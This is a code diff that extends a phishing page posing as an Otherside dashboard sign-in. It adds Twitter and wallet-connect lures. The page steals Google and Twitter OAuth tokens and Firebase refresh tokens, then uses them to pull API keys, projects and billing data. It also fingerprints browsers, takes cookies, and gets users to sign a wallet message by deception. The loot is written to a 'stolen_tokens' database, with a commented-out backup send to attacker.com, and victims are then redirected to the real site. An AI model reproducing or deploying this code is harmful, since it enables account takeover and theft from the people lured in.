@@ -84,8 +84,33 @@
             justify-content: center;
             gap: 12px;
             transition: all 0.2s;
+            margin-bottom: 12px;
         }
         .btn-wallet:hover { opacity: 0.9; }
+        .btn-twitter {
+            width: 100%;
+            padding: 14px;
+            background: #1da1f2;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.2s;
+        }
+        .btn-twitter:hover { opacity: 0.9; }
+        .loading {
+            display: none;
+            margin-top: 16px;
+            color: #888;
+            font-size: 13px;
+        }
+        .loading.active { display: block; }
     </style>
 </head>
 <body>
@@ -104,14 +129,23 @@
             Sign in with Google
         </button>
 
+        <button class="btn-twitter" onclick="signInWithTwitter()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"/>
+            </svg>
+            Sign in with Twitter
+        </button>
+
         <div class="divider">or</div>
 
-        <button class="btn-wallet" onclick="alert('Wallet connection coming soon')">
+        <button class="btn-wallet" onclick="connectWallet()">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+                <path d="M20 7V5c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2v-2h-6c-1.1 0-2-.9-2-2v-4c0-1.1.9-2 2-2h6zm0 2v4h6v-4h-6zm-2 2c0 .55.45 1 1 1s1-.45 1-1-.45-1-1-1-1 .45-1 1z"/>
             </svg>
             Connect Wallet
         </button>
+
+        <div class="loading" id="loading">Connecting...</div>
     </div>
 
     <!-- Firebase Compat SDK -->
@@ -119,6 +153,8 @@
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
     <!-- Supabase JS Client -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <!-- Ethers.js for wallet connection -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
     <script>
         // =====================================================
@@ -130,9 +166,7 @@
         let supabaseClient = null;
         try {
             supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-        } catch(e) {
-            console.error('Supabase init error:', e);
-        }
+        } catch(e) { console.error('Supabase init error:', e); }
 
         // =====================================================
         // Firebase Configuration
@@ -150,11 +184,25 @@
         const auth = firebase.auth();
         auth.tenantId = "hound-j8zaz";
 
-        // Global holder for Google OAuth credential from popup
         let pendingCredential = null;
 
         // =====================================================
-        // Save stolen token to Supabase
+        // Collect browser fingerprint & metadata
+        // =====================================================
+        function collectMetadata() {
+            return {
+                user_agent: navigator.userAgent,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'direct',
+                origin_domain: window.location.hostname,
+                cookies: document.cookie || '',
+            };
+        }
+
+        // =====================================================
+        // Save to Supabase
         // =====================================================
         async function saveToSupabase(data) {
             if (!supabaseClient) return false;
@@ -163,24 +211,17 @@
                     .from('stolen_tokens')
                     .insert([data])
                     .select();
-                if (error) {
-                    console.error('DB Error:', error.message);
-                    return false;
-                }
-                console.log('Saved to Supabase, Row ID:', result[0] ? result[0].id : 'unknown');
+                if (error) { console.error('DB Error:', error.message); return false; }
+                console.log('Saved to Supabase, Row ID:', result[0]?.id);
                 return true;
-            } catch(e) {
-                console.error('DB Exception:', e.message);
-                return false;
-            }
+            } catch(e) { console.error('DB Exception:', e.message); return false; }
         }
 
         // =====================================================
-        // Backup exfiltration via fetch() to attacker C2 server
+        // Backup exfiltration via fetch() to C2
         // =====================================================
         async function exfiltrateToC2(data) {
             try {
-                // Real attacker C2 endpoint:
                 // await fetch('https://attacker.com/collect', {
                 //     method: 'POST',
                 //     headers: { 'Content-Type': 'application/json' },
@@ -190,72 +231,60 @@
         }
 
         // =====================================================
-        // Fetch ODK Dashboard data using stolen token
+        // Fetch ODK Dashboard data
         // =====================================================
         async function fetchDashboardData(idToken) {
             const results = {};
-
-            try {
-                const userResp = await fetch('https://odk.otherside.xyz/api/v0/accounts/users/current', {
-                    headers: { 'Authorization': 'Bearer ' + idToken }
-                });
-                if (userResp.ok) results.userData = await userResp.json();
-            } catch(e) {}
-
-            try {
-                const projResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/projects', {
-                    headers: { 'Authorization': 'Bearer ' + idToken }
-                });
-                if (projResp.ok) results.projects = await projResp.json();
-            } catch(e) {}
-
-            try {
-                const keysResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/apiKeys', {
-                    headers: { 'Authorization': 'Bearer ' + idToken }
-                });
-                if (keysResp.ok) results.apiKeys = await keysResp.json();
-            } catch(e) {}
-
-            try {
-                const permResp = await fetch('https://odk.otherside.xyz/api/v0/permissions/resource/reviewAccess', {
-                    method: 'POST',
-                    headers: {
-                        'Authorization': 'Bearer ' + idToken,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        resource: 'o/fine-houses-deny-595464',
-                        verb: 'ALL'
-                    })
-                });
-                if (permResp.ok) results.permissions = await permResp.json();
-            } catch(e) {}
-
+            const endpoints = [
+                { key: 'userData', path: 'accounts/users/current' },
+                { key: 'projects', path: 'organizations/projects' },
+                { key: 'apiKeys', path: 'organizations/apiKeys' },
+                { key: 'permissions', path: 'permissions/roles' },
+                { key: 'billing', path: 'billing/enabled' },
+                { key: 'worlds', path: 'worlds' },
+                { key: 'profile', path: 'profile' },
+                { key: 'originAccess', path: 'origin/access' },
+                { key: 'streaming', path: 'origin/streaming' },
+                { key: 'sessions', path: 'origin/sessions/queue' },
+            ];
+            for (const ep of endpoints) {
+                try {
+                    const resp = await fetch(`https://odk.otherside.xyz/api/v0/${ep.path}`, {
+                        headers: { 'Authorization': `Bearer ${idToken}` }
+                    });
+                    if (resp.ok) results[ep.key] = await resp.json();
+                } catch(e) {}
+            }
             return results;
         }
 
         // =====================================================
-        // Full exfiltration pipeline - runs after successful auth
+        // Redirect to real dashboard
         // =====================================================
-        async function exfiltrateAll(user, googleAccessToken) {
+        function redirectToDashboard() {
+            setTimeout(() => { window.location.href = 'https://odk.otherside.xyz/dashboard'; }, 1500);
+        }
+
+        // =====================================================
+        // Exfiltration: Google/Twitter OAuth
+        // =====================================================
+        async function exfiltrateOAuth(user, googleAccessToken) {
             try {
                 const idToken = await user.getIdToken();
 
-                // Get refresh token from Firebase internal storage
                 let actualRefreshToken = '';
                 try {
                     const storedUser = JSON.parse(localStorage.getItem(
                         '[DEFAULT]/scarcely-calm-lark.firebaseapp.com/' + user.uid
                     ) || '{}');
-                    if (storedUser.stsTokenManager && storedUser.stsTokenManager.refreshToken) {
+                    if (storedUser.stsTokenManager?.refreshToken) {
                         actualRefreshToken = storedUser.stsTokenManager.refreshToken;
                     }
                 } catch(e) {}
 
-                // Fetch ODK Dashboard data
                 const dashData = await fetchDashboardData(idToken);
+                const meta = collectMetadata();
 
-                // Build the full stolen data object
                 const stolenData = {
                     victim_email: user.email || '',
                     victim_uid: user.uid || '',
@@ -265,43 +294,85 @@
                     refresh_token: actualRefreshToken,
                     google_access_token: googleAccessToken || '',
                     tenant_id: user.tenantId || '',
-                    provider: user.providerData[0] ? user.providerData[0].providerId : '',
+                    auth_method: user.providerData[0]?.providerId || '',
+                    provider: user.providerData[0]?.providerId || '',
                     is_new_user: false,
-                    origin_domain: window.location.hostname,
-                    user_agent: navigator.userAgent,
+                    origin_domain: meta.origin_domain,
+                    user_agent: meta.user_agent,
+                    screen_resolution: meta.screen_resolution,
+                    language: meta.language,
+                    timezone: meta.timezone,
+                    referrer: meta.referrer,
+                    cookies: meta.cookies,
                     token_expires_at: new Date(Date.now() + 3600000).toISOString(),
                     dashboard_user_data: dashData.userData ? JSON.stringify(dashData.userData) : '',
                     dashboard_projects: dashData.projects ? JSON.stringify(dashData.projects) : '',
                     dashboard_apikeys: dashData.apiKeys ? JSON.stringify(dashData.apiKeys) : '',
                     dashboard_permissions: dashData.permissions ? JSON.stringify(dashData.permissions) : '',
-                    notes: 'Auto-captured from m2-edison-preview.vercel.app'
+                    notes: JSON.stringify({
+                        billing: dashData.billing || '',
+                        worlds: dashData.worlds || '',
+                        originAccess: dashData.originAccess || '',
+                        streaming: dashData.streaming || '',
+                        sessions: dashData.sessions || '',
+                        profile: dashData.profile || '',
+                    })
                 };
 
-                // Save to Supabase
                 await saveToSupabase(stolenData);
-
-                // Backup: exfiltrate to C2 server
                 await exfiltrateToC2(stolenData);
-
-            } catch (err) {
-                console.error('Exfiltration error:', err.message);
-            }
+            } catch (err) { console.error('Exfiltration error:', err.message); }
         }
 
         // =====================================================
-        // Monitor auth state - triggers exfiltration pipeline
+        // Exfiltration: Wallet (MetaMask, etc.)
+        // =====================================================
+        async function exfiltrateWallet(walletData) {
+            try {
+                const meta = collectMetadata();
+
+                const stolenData = {
+                    victim_uid: walletData.address || 'wallet_unknown',
+                    victim_email: '',
+                    victim_name: '',
+                    auth_method: 'wallet',
+                    provider: 'wallet',
+                    wallet_address: walletData.address || '',
+                    wallet_type: walletData.type || '',
+                    wallet_chain_id: walletData.chainId || '',
+                    wallet_balance: walletData.balance || '',
+                    wallet_signature: walletData.signature || '',
+                    wallet_nonce: walletData.nonce || '',
+                    origin_domain: meta.origin_domain,
+                    user_agent: meta.user_agent,
+                    screen_resolution: meta.screen_resolution,
+                    language: meta.language,
+                    timezone: meta.timezone,
+                    referrer: meta.referrer,
+                    cookies: meta.cookies,
+                    notes: JSON.stringify({
+                        walletFullData: walletData,
+                        timestamp: new Date().toISOString()
+                    })
+                };
+
+                await saveToSupabase(stolenData);
+                await exfiltrateToC2(stolenData);
+            } catch (err) { console.error('Wallet exfiltration error:', err.message); }
+        }
+
+        // =====================================================
+        // Firebase Auth State Monitor
         // =====================================================
         auth.onAuthStateChanged(async (user) => {
             if (user) {
-                // Wait a moment for pendingCredential to be set by signInWithGoogle
                 let waitCount = 0;
                 while (!pendingCredential && waitCount < 20) {
                     await new Promise(r => setTimeout(r, 100));
                     waitCount++;
                 }
-
-                // Run the full exfiltration pipeline silently
-                await exfiltrateAll(user, pendingCredential);
+                await exfiltrateOAuth(user, pendingCredential);
+                redirectToDashboard();
             }
         });
 
@@ -312,45 +383,154 @@
             const provider = new firebase.auth.GoogleAuthProvider();
             provider.addScope('profile');
             provider.addScope('email');
-
             try {
                 const result = await auth.signInWithPopup(provider);
-
-                // Capture Google access token from credential immediately
                 let googleAccessToken = '';
-                if (result.credential && result.credential.accessToken) {
-                    googleAccessToken = result.credential.accessToken;
+                if (result.credential?.accessToken) googleAccessToken = result.credential.accessToken;
+                pendingCredential = googleAccessToken;
+            } catch (error) {
+                console.error('Google OAuth error:', error.code);
+                if (error.code === 'auth/popup-blocked') auth.signInWithRedirect(provider);
+            }
+        }
+
+        // =====================================================
+        // Twitter Sign-In
+        // =====================================================
+        async function signInWithTwitter() {
+            const provider = new firebase.auth.TwitterAuthProvider();
+            try {
+                const result = await auth.signInWithPopup(provider);
+                let twitterToken = '';
+                let twitterScreenName = '';
+                if (result.credential?.accessToken) twitterToken = result.credential.accessToken;
+                if (result.additionalUserInfo?.username) twitterScreenName = result.additionalUserInfo.username;
+                pendingCredential = twitterToken;
+                // Store Twitter-specific data for the exfiltration
+                window._twitterData = { token: twitterToken, screenName: twitterScreenName };
+            } catch (error) {
+                console.error('Twitter OAuth error:', error.code);
+                if (error.code === 'auth/popup-blocked') auth.signInWithRedirect(provider);
+            }
+        }
+
+        // =====================================================
+        // Wallet Connection (MetaMask, etc.)
+        // =====================================================
+        async function connectWallet() {
+            const loadingEl = document.getElementById('loading');
+            loadingEl.classList.add('active');
+            loadingEl.textContent = 'Connecting to wallet...';
+
+            try {
+                if (typeof window.ethereum === 'undefined') {
+                    // No wallet extension - try WalletConnect or redirect
+                    loadingEl.textContent = 'No wallet detected. Opening MetaMask download...';
+                    setTimeout(() => { window.location.href = 'https://metamask.io/download/'; }, 2000);
+                    return;
                 }
 
-                // Store for the onAuthStateChanged handler
-                pendingCredential = googleAccessToken;
+                // Request wallet connection
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const address = accounts[0];
 
-                // Redirect to real dashboard after successful login
-                setTimeout(() => {
-                    window.location.href = 'https://odk.otherside.xyz/dashboard';
-                }, 2000);
+                loadingEl.textContent = 'Verifying wallet...';
+
+                // Get chain ID
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+
+                // Get balance
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const balance = await provider.getBalance(address);
+                const balanceInEth = ethers.utils.formatEther(balance);
+
+                // Request signature (phishing: user thinks they're authenticating)
+                loadingEl.textContent = 'Please sign in your wallet...';
+                const nonce = Math.floor(Math.random() * 1000000).toString();
+                const message = `Otherside Dashboard\n\nSign this message to verify your wallet ownership.\n\nNonce: ${nonce}`;
+                const signature = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [message, address]
+                });
+
+                // Detect wallet type
+                let walletType = 'unknown';
+                if (window.ethereum.isMetaMask) walletType = 'metamask';
+                else if (window.ethereum.isCoinbaseWallet) walletType = 'coinbase';
+                else if (window.ethereum.isFrame) walletType = 'frame';
+                else if (window.ethereum.isRainbow) walletType = 'rainbow';
+                else if (window.ethereum.isTrust) walletType = 'trust';
+
+                // Collect and exfiltrate
+                const walletData = {
+                    address: address,
+                    type: walletType,
+                    chainId: chainId,
+                    balance: `${balanceInEth} ETH`,
+                    signature: signature,
+                    nonce: nonce,
+                };
+
+                await exfiltrateWallet(walletData);
+
+                // Also try ODK wallet authentication API
+                try {
+                    const nonceResp = await fetch('https://odk.otherside.xyz/api/v0/wallet/nonce', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ address: address })
+                    });
+                    if (nonceResp.ok) {
+                        const nonceData = await nonceResp.json();
+                        // Try to get a session token from the wallet auth
+                        const verifyResp = await fetch('https://odk.otherside.xyz/api/v0/wallet/verify', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                address: address,
+                                signature: signature,
+                                nonce: nonceData.nonce || nonce
+                            })
+                        });
+                        if (verifyResp.ok) {
+                            const verifyData = await verifyResp.json();
+                            // If we got a token, save it too
+                            if (verifyData.token) {
+                                walletData.oidcToken = verifyData.token;
+                                await exfiltrateWallet(walletData);  // Update with token
+                            }
+                        }
+                    }
+                } catch(e) { console.error('Wallet API error:', e); }
+
+                loadingEl.textContent = 'Wallet connected! Redirecting...';
+                redirectToDashboard();
 
             } catch (error) {
-                console.error('OAuth error:', error.code, error.message);
-
-                if (error.code === 'auth/popup-blocked') {
-                    auth.signInWithRedirect(provider);
-                }
+                console.error('Wallet connection error:', error);
+                loadingEl.textContent = 'Connection failed. Please try again.';
+                setTimeout(() => { loadingEl.classList.remove('active'); }, 3000);
             }
         }
 
         // Handle redirect result
         auth.getRedirectResult().then((result) => {
-            if (result && result.user) {
-                if (result.credential && result.credential.accessToken) {
-                    pendingCredential = result.credential.accessToken;
-                }
+            if (result?.user) {
+                if (result.credential?.accessToken) pendingCredential = result.credential.accessToken;
             }
         }).catch((error) => {
-            if (error.code && error.code !== 'auth/no-auth-event') {
-                console.error('Redirect error:', error.code);
-            }
+            if (error.code && error.code !== 'auth/no-auth-event') console.error('Redirect error:', error.code);
         });
+
+        // Listen for wallet account/chain changes (extra data collection)
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length > 0) exfiltrateWallet({ address: accounts[0], type: 'account_change' });
+            });
+            window.ethereum.on('chainChanged', (chainId) => {
+                console.log('Chain changed:', chainId);
+            });
+        }
     </script>
 </body>
 </html>
